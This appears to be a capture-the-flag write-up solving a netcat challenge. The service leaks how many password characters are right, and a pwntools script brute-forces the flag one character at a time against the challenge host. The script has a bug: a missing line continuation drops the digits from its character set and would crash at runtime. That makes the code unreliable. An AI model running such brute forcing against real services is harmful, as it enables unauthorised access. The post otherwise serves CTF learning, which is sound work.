---
layout: post
date: 2023-09-12 18:00:00 +0200
title: "Flag finder"
excerpt_separator: <!--more-->
---

In this challenge, we are tasked with guessing a flag using a `nectcat` service.

<!--more-->

This is less of a _cybersecurity_ challenge and more of a learning to use `netcat` one.

**It requires brute forcing the service, make sure that is the challenge's intent before doing something similar**

## The service

We first need to guess the length of the flag

```
What is the password: p
p is not long enough
```

And once that is done, the server tells us how many characters we got right

```
What is the password: ppppppppppppppppppp
User input: 112
Flag input: 112
There's been an error
```

```
What is the password: pcppppppppppppppppp
User input: 112
Flag input: 112
User input: 99
Flag input: 99
There's been an error
```

## The code

We use `pwntools` for our python scripts and it is particularly useful here.

This script counts how many `\n` characters it received to judge how good a password is

```py
from pwn import *
import time

context.log_level = 'error' # We do not want any messages from pwntools

pwd = ""                    # We could of put pctf{

final_len = 19

# Character set for the brute force
character_set = string.ascii_lowercase \
    + string.ascii_uppercase
    + '0123456789{}'

# How many \n in the current best password attempt
best = 2

for i in range(final_len):
    for c in character_set:
        conn = remote('chal.pctf.competitivecyber.club', 4757)
        conn.recv()
        passwd= pwd + c + "_" * (final_len - 1 - i)

        conn.sendline(passwd)
        time.sleep(0.5)
        count = conn.recv().count(b'\n')

        if count > best:
            best = count
            pwd += c
            print(pwd)
            break
```
